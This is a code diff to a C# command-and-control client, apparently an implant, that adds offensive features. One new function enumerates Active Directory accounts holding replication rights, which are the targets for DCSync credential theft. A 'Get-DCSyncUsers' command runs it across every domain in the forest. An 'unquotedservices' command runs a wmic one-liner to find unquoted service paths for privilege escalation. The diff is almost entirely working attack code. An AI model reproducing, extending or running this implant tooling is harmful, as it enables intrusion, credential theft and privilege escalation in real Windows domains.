@@ -15,7 +15,9 @@ using System.DirectoryServices.AccountManagement;
 using System.DirectoryServices.ActiveDirectory;
 //using System.Runtime.InteropServies;
 using System.DirectoryServices.AccountManagement;
-
+using System.Collections;
+using System.Security.Principal;
+using System.Security.AccessControl;
 
 namespace C2Client
 {
@@ -341,6 +343,57 @@ namespace C2Client
             return sw;
         }
 
+        public string GetDCSyncUsers(string domainDN)
+        {
+            string result;
+            Console.WriteLine(domainDN);
+            StringWriter sw = new StringWriter();
+            sw.WriteLine("-------- DOMAIN: {0} ---------", domainDN);
+            Hashtable ht = new Hashtable();
+            ht.Add("DS-Replication-Get-Changes", "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2");
+            ht.Add("DS-Replication-Get-Changes-All", "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2");
+            ht.Add("DS-Replication-Get-Changes-In-Filtered-Set", "89e95b76-444d-4c62-991a-0facbeda640c");
+            ht.Add("DS-Replication-Manage-Topology", "1131f6ac-9c07-11d1-f79f-00c04fc2dcd2");
+            ht.Add("DS-Replication-Monitor-Topology", "f98340fb-7c5b-4cdb-a00b-2ebdfa115a96");
+            ht.Add("DS-Replication-Synchronize", "1131f6ab-9c07-11d1-f79f-00c04fc2dcd2");
+
+            DirectoryEntry de = new DirectoryEntry("LDAP://" + domainDN);
+            DirectorySearcher ds = new DirectorySearcher();
+            ds.SearchRoot = de;
+
+            foreach (SearchResult sr in ds.FindAll())
+            {
+                try
+                {
+                    DirectoryEntry temp = sr.GetDirectoryEntry();
+                    AuthorizationRuleCollection arc = temp.ObjectSecurity.GetAccessRules(true, true, typeof(NTAccount));
+
+                    foreach (ActiveDirectoryAccessRule a in arc)
+                    {
+                        if (domainDN.Contains(temp.Name.ToString()))
+                        {
+
+                            foreach (DictionaryEntry d in ht)
+                            {
+                                if (d.Value.ToString() == a.ObjectType.ToString())
+                                {
+                                    sw.WriteLine(a.IdentityReference);
+                                    sw.WriteLine(d.Key.ToString());
+                                    sw.WriteLine(a.ObjectType);
+                                    //sw.WriteLine(a.AccessControlType);
+                                    //sw.WriteLine(a.ActiveDirectoryRights);
+
+                                    sw.WriteLine();
+                                }
+                            }
+                        }
+                    }
+                }
+                catch { }
+            }
+            result = sw.ToString();
+            return result;
+        }
         public static void Main(string[] args)
         {
             if (args.Length != 4)
@@ -502,6 +555,49 @@ namespace C2Client
                         Thread.Sleep(1000);
 
 
+                    }
+
+                    else if (cmd == "Get-DCSyncUsers")
+                    {
+
+                        Forest f = Forest.GetCurrentForest();
+                        DomainCollection domains = f.Domains;
+                        cmd = "";
+                        foreach(Domain d in domains)
+                        {
+                            string domainName = d.Name;
+
+                            string[] dcs = domainName.Split('.');
+                            for(int i = 0; i < dcs.Length; i++)
+                            {
+                                dcs[i] = "DC=" + dcs[i];
+                            }
+
+                            string domainDN = String.Join(",", dcs);
+
+                            Program p = new Program();
+                            Thread dcsync = new Thread(() => { cmd += p.GetDCSyncUsers(domainDN); });
+                            dcsync.Name = "get-dcsyncusers";
+                            dcsync.Start();
+                            dcsync.Join();
+
+                            
+
+
+                        }
+
+                        Thread.Sleep(2000);
+                    }
+
+                    else if (cmd == "unquotedservices")
+                    {
+
+                        Program p = new Program();
+                        string sep = @"wmic service get name,pathname | findstr /v /i system32 | findstr /v \`" +'"';
+                        Console.WriteLine(sep);
+                        cmd = p.GetResult(sep);
+                        Console.WriteLine(cmd);
+                    
                     }
                     else
                     {
